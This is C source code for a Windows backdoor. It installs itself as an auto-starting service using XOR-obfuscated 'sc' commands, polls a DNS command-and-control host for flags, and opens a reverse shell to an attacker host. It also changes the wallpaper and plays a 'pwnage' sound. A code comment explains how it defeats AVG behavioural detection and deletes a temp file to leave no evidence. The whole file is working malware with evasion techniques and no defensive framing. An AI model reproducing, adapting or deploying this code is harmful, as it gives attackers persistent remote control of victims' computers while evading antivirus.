#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

#include <mmsystem.h>

#include "backdoor.h"

#define MINIMIZE_ALL_WINDOWS 419

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void remove_service(void);
void write_pwnage_wallpaper(void);
void play_pwnage_sound(void);

extern unsigned char *pwnage_image_data;
extern int pwnage_image_data_len;
extern unsigned char pwnage_image_xor_val;

extern int pwned_sound_data_len;
extern unsigned char *pwned_sound_data;
extern unsigned char pwned_sound_xor_val;

char *xorit(unsigned char xor_val, char *str, int len) {
	char *buf=malloc(len+1);
	int i=0;

	for (i=0;i<len;i++) {
		buf[i]=(str[i] ^ (unsigned char)xor_val);
	}

	buf[i]=(char)0;

	return buf;
}

unsigned int cnc_get_status() {
	struct hostent *host;
	unsigned int cnc_val=0;
	int chksum, calc_chksum;
			
	host=gethostbyname(BD_CNC_HOST);
	if (host) {
		cnc_val=htonl(((struct in_addr *)host->h_addr)->s_addr);
		chksum=cnc_val & 0xff;	
		cnc_val=cnc_val >> 8;

		calc_chksum=(cnc_val >> 16 & 0xff) + (cnc_val >> 8 & 0xff) + (cnc_val & 0xff);
		calc_chksum &= 0xff;
		#ifdef DEBUG
			printf("CNC value      = %08X\n", cnc_val);
			printf("Calc checksum  = %08X\n", calc_chksum);
			printf("Checksum value = %08X\n", chksum);
			printf("\nFlags:\n\n");
			printf("BD_CNC_RSHELL_FLAG          = %s\n", (cnc_val & BD_CNC_RSHELL_FLAG) ? "Yes" : "No");
		#endif 

		if (calc_chksum != chksum) {
			#ifdef DEBUG
				printf("CNC value checksum doesn't match!\n");
			#endif

			cnc_val = 0;
		}
	} else {
		#ifdef DEBUG
			printf("CNC: Can't resolve DNS entry %s\n", BD_CNC_HOST);
		#endif
	}

	return cnc_val;
}

DWORD WINAPI backdoor_thread(LPVOID lpParam) {
	struct hostent *host;
	unsigned int cnc_val;

	WSADATA wsaData;
	SOCKET Winsock;
	struct sockaddr_in sin;
	STARTUPINFO ini_process;
	PROCESS_INFORMATION process_info;
	FILE *file;
	char buf[100];
	char *fn, *cmd;
	int done=0;

	unsigned int handle;

	WSAStartup(MAKEWORD(2,2), &wsaData);

	sin.sin_family = AF_INET;
	sin.sin_port = htons(BD_PORT);

	while (!done) {
		cnc_val=cnc_get_status();
		if (cnc_val & BD_CNC_SELF_DESTRUCT) {
			#ifdef DEBUG 
				printf("Self destruct flag set!\n");
			#endif 
					
			remove_service();
			done=1;
			continue;
		}

		if (!(cnc_val & BD_CNC_RSHELL_FLAG)) {
			#ifdef DEBUG
				printf("CNC says don't run, so sleeping...\n");
			#endif

			Sleep(BD_CNC_SLEEP_TIME);
			continue;
		}

		host=gethostbyname(BD_ATTACK_HOST);
		if (host) {
			sin.sin_addr.s_addr = ((struct in_addr *)host->h_addr)->s_addr;
		} else {
			#ifdef DEBUG
				printf("Can't resolve DNS, sleeping...\n");
			#endif

			Sleep(BD_DNS_SLEEP_TIME);
			continue;
		}

		Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
	
		if (WSAConnect(Winsock,(SOCKADDR*)&sin,sizeof(sin),NULL,NULL,NULL,NULL)) {
			#ifdef DEBUG
				printf("Connection failed, sleeping....\n");
			#endif

			Sleep(BD_RSHELL_SLEEP_TIME);
		} else {
			memset(&ini_process,0,sizeof(ini_process));
		        ini_process.cb=sizeof(ini_process);
		        ini_process.dwFlags=STARTF_USESTDHANDLES;

			/*
				So AVG is apparently a real pain with the behavioural analysis, so the following
				IS NECESSARY!!! Basically, the AV freaks out when you take the Winsock value or
				any value copied or somehow derived from that and then pass it to the CreateProcess
				structures as a redirect for stdin/stdout/stderr.  It doesn't matter how much I seem to 
				obfuscate it, it catches me every time!  So the solution here is:

				1. Use the "system" command to echo the integer value into a file
				2. Open that file and fscanf the value back in
				3. Delete the file so there is no evidence

				Attempts were made to do this without invoking the system command but they failed. 
				AVG is smart enough to realize that we are writing to and then later reading from the
				same file.
				
			*/

			// echo %d > c:\windows\temp\tempval.tmp
			cmd=xorit(0x99, "\xfc\xfa\xf1\xf6\xb9\xbc\xfd\xb9\xa7\xb9\xfa\xa3\xc5\xee\xf0\xf7\xfd\xf6\xee\xea\xc5\xed\xfc\xf4\xe9\xc5\xed\xfc\xf4\xe9\xef\xf8\xf5\xb7\xed\xf4\xe9",37);
		
			snprintf(buf, 100, cmd, (int)Winsock);
			system(buf);
	
			// c:\windows\temp\tempval.tmp
			fn=xorit(0xF0, "\x93\xca\xac\x87\x99\x9e\x94\x9f\x87\x83\xac\x84\x95\x9d\x80\xac\x84\x95\x9d\x80\x86\x91\x9c\xde\x84\x9d\x80",27);
	
			#ifdef DEBUG	
				printf("Temp filename=\"%s\"\n", fn);
			#endif 
		
			file=fopen(fn,"r");
				
			if (file) {
				fscanf(file, "%d", &handle);
				fclose(file);
			} else {
			#ifdef DEBUG
				printf("Failed to open temp file: %s\n", strerror(errno));
			#endif
				continue;	
			}

			// c:\windows\temp\tempval.tmp
			fn=xorit(0xB3, "\xd0\x89\xef\xc4\xda\xdd\xd7\xdc\xc4\xc0\xef\xc7\xd6\xde\xc3\xef\xc7\xd6\xde\xc3\xc5\xd2\xdf\x9d\xc7\xde\xc3",27);
		
			// delete file	
			unlink(fn);
		
			#ifdef DEBUG
				printf("Winsock  = %08X\n", (unsigned int)Winsock);
				printf("handle   = %08X\n", (unsigned int)handle);
				printf("buf      = \"%s\"\n", buf);
			#endif
		
			ini_process.hStdInput = ini_process.hStdOutput = ini_process.hStdError = (HANDLE)handle;
		
			CreateProcess(NULL,BD_SHELL_CMD,NULL,NULL,TRUE,0,NULL,NULL,&ini_process,&process_info);
	
			play_pwnage_sound();
		
			#ifdef DEBUG
				printf("Waiting for process to exit...\n");
			#endif
		
			// Wait until child process exits.
			WaitForSingleObject( process_info.hProcess, INFINITE );

			#ifdef DEBUG
				printf("Process has exited...\n");
			#endif
		
			// Close process and thread handles. 
			CloseHandle( process_info.hProcess );
			CloseHandle( process_info.hThread );
		}
	}

	return 0;
}

// Control handler function
void ControlHandler(DWORD request) {
    switch(request) {
        case SERVICE_CONTROL_STOP:
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &ServiceStatus);
            return;

        case SERVICE_CONTROL_SHUTDOWN:
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &ServiceStatus);
            return;

        default:
            break;
    }

    // Report current status
    SetServiceStatus (hStatus,  &ServiceStatus);

    return;
}

void ServiceMain(int argc, char** argv) {
    int error;

    ServiceStatus.dwServiceType        = SERVICE_WIN32;
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint         = 0;
    ServiceStatus.dwWaitHint           = 0;

    hStatus = RegisterServiceCtrlHandler(
                BD_SERVICE_NAME,
                (LPHANDLER_FUNCTION)ControlHandler);
    if (hStatus == (SERVICE_STATUS_HANDLE)0) {
        // Registering Control Handler failed
        return;
    }

    // We report the running status to SCM.
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus (hStatus, &ServiceStatus);

    backdoor_thread(NULL);

    return;
}

#ifdef BD_INSTALL_METHOD_SHELL
void install_service() {
	TCHAR szExeFileName[MAX_PATH]; 
	char cmd[256];

	// Install service and start it
	GetModuleFileName(NULL, szExeFileName, MAX_PATH);
	
	// copy /y %s %s
	snprintf(cmd, 255, xorit(0x99, "\xfa\xf6\xe9\xe0\xb9\xb6\xe0\xb9\xbc\xea\xb9\xbc\xea",13), szExeFileName, BD_SERVICE_EXE);
	system(cmd);

	// sc create "%s" binPath="%s" start=auto
	snprintf(cmd, 255, xorit(0x99, "\xea\xfa\xb9\xfa\xeb\xfc\xf8\xed\xfc\xb9\xbb\xbc\xea\xbb\xb9\xfb\xf0\xf7\xc9\xf8\xed\xf1\xa4\xbb\xbc\xea\xbb\xb9\xea\xed\xf8\xeb\xed\xa4\xf8\xec\xed\xf6",38), BD_SERVICE_NAME, BD_SERVICE_EXE);
	system(cmd);
	
	// sc description "%s" "%s"
	snprintf(cmd, 255, xorit(0xB3, "\xc0\xd0\x93\xd7\xd6\xc0\xd0\xc1\xda\xc3\xc7\xda\xdc\xdd\x93\x91\x96\xc0\x91\x93\x91\x96\xc0\x91",24), BD_SERVICE_NAME, BD_SERVICE_DESCRIPTION);
	system(cmd);
	
	// sc start "%s"
	snprintf(cmd, 255, xorit(0xB3, "\xc0\xd0\x93\xc0\xc7\xd2\xc1\xc7\x93\x91\x96\xc0\x91",13), BD_SERVICE_NAME);
	system(cmd);

	write_pwnage_wallpaper();
}

#endif

#ifdef BD_INSTALL_METHOD_INT
void install_service() {
	TCHAR szExeFileName[MAX_PATH]; 
	FILE *infile, *outfile;
	int bytes_read;
	void *buf;
	char cmd[256];

	// Install service and start it
	GetModuleFileName(NULL, szExeFileName, MAX_PATH);

	buf=malloc(BD_BUF_SIZE);
	if (!buf) {
		printf(BD_ERR_INSTALL_FAILURE);
		return;
	}

	infile=fopen(szExeFileName, "rb");
	if (!infile) {
		printf(BD_ERR_INSTALL_FAILURE);
		return;
	}	

	outfile=fopen(BD_SERVICE_EXE, "wb");
	if (!outfile) {
		printf(BD_ERR_INSTALL_FAILURE);
		return;
	}

	do {
		bytes_read=fread(buf, 1, BD_BUF_SIZE, infile);
		if (bytes_read) {
			fwrite(buf, bytes_read, 1, outfile);
		}
	} while (bytes_read < BD_BUF_SIZE);

	fclose(infile);
	fclose(outfile);
	free(buf);

	// sc create "%s" binPath="%s" start=auto
	snprintf(cmd, 255, xorit(0x99, "\xea\xfa\xb9\xfa\xeb\xfc\xf8\xed\xfc\xb9\xbb\xbc\xea\xbb\xb9\xfb\xf0\xf7\xc9\xf8\xed\xf1\xa4\xbb\xbc\xea\xbb\xb9\xea\xed\xf8\xeb\xed\xa4\xf8\xec\xed\xf6",38), BD_SERVICE_NAME, BD_SERVICE_EXE);
	system(cmd);
	
	// sc description "%s" "%s"
	snprintf(cmd, 255, xorit(0xB3, "\xc0\xd0\x93\xd7\xd6\xc0\xd0\xc1\xda\xc3\xc7\xda\xdc\xdd\x93\x91\x96\xc0\x91\x93\x91\x96\xc0\x91",24), BD_SERVICE_NAME, BD_SERVICE_DESCRIPTION);
	system(cmd);
	
	// sc start "%s"
	snprintf(cmd, 255, xorit(0xB3, "\xc0\xd0\x93\xc0\xc7\xd2\xc1\xc7\x93\x91\x96\xc0\x91",13), BD_SERVICE_NAME);
	system(cmd);
}

#endif

void remove_service() {
	char cmd[256];

	// sc stop "%s"
	snprintf(cmd, 255, xorit(0xF0, "\x83\x93\xd0\x83\x84\x9f\x80\xd0\xd2\xd5\x83\xd2",12), BD_SERVICE_NAME);
	system(cmd);

	// sc delete "%s"
	snprintf(cmd, 255, xorit(0x99, "\xea\xfa\xb9\xfd\xfc\xf5\xfc\xed\xfc\xb9\xbb\xbc\xea\xbb",14), BD_SERVICE_NAME);
	system(cmd);

	unlink(BD_SERVICE_EXE);
	unlink(BD_WALLPAPER_FN);
	unlink(BD_SOUND_PWNED);
}

void write_pwnage_wallpaper() {
	FILE *file;
	unsigned char *buf;
	int i;

	file=fopen(BD_WALLPAPER_FN, "wb");
	if (!file) {
		return;
	}

	buf=malloc(pwnage_image_data_len);
	if (!buf) {
		fclose(file);
		return;
	}

	for (i=0;i<pwnage_image_data_len;i++) {
		buf[i]=pwnage_image_data[i] ^ pwnage_image_xor_val;
	}

	fwrite(buf, 1, pwnage_image_data_len, file);

	free(buf);
	fclose(file);

	system(BD_REG_DESKTOP_WALLPAPER_CMD);
	system(BD_REG_DESKTOP_STRETCH_CMD);

	SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, BD_WALLPAPER_FN, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

	HWND lHwnd = FindWindow("Shell_TrayWnd",NULL);
    	SendMessage(lHwnd,WM_COMMAND,MINIMIZE_ALL_WINDOWS,0); // Minimize all windows
}

void play_pwnage_sound() {
	static int sound_opened=0;
	HANDLE hThread;
	DWORD dwThreadId;

	FILE *file;
	unsigned char *buf;
	int i;

	if (!sound_opened) {
		file=fopen(BD_SOUND_PWNED, "wb");
		if (!file) {
			return;
		}

		buf=malloc(pwned_sound_data_len);
		if (!buf) {
			fclose(file);
			return;
		}

		for (i=0;i<pwned_sound_data_len;i++) {
			buf[i]=pwned_sound_data[i] ^ pwned_sound_xor_val;
		}

		fwrite(buf, 1, pwned_sound_data_len, file);

		free(buf);
		fclose(file);
	
		mciSendString(BD_MCI_SEND_STR_OPEN, NULL, 0, NULL);
	}

	sound_opened=1;

	mciSendString(BD_MCI_SEND_STR_PLAY, NULL, 0, NULL);
}

void main(int argc, char *argv[]) {
	if (argc == 2) { 
		if (!strcmp(argv[1], BD_INSTALL_SWITCH)) {
			install_service();
		} else if (!strcmp(argv[1], BD_REMOVE_SWITCH)) {
			remove_service();
		} else if (!strcmp(argv[1], BD_NOSVC_SWITCH)) {
			backdoor_thread(NULL);
		}
	} else {
		SERVICE_TABLE_ENTRY ServiceTable[2];
		ServiceTable[0].lpServiceName = BD_SERVICE_NAME;
		ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

		ServiceTable[1].lpServiceName = NULL;
		ServiceTable[1].lpServiceProc = NULL;

		// Start the control dispatcher thread for our service
		StartServiceCtrlDispatcher(ServiceTable);
	}
}
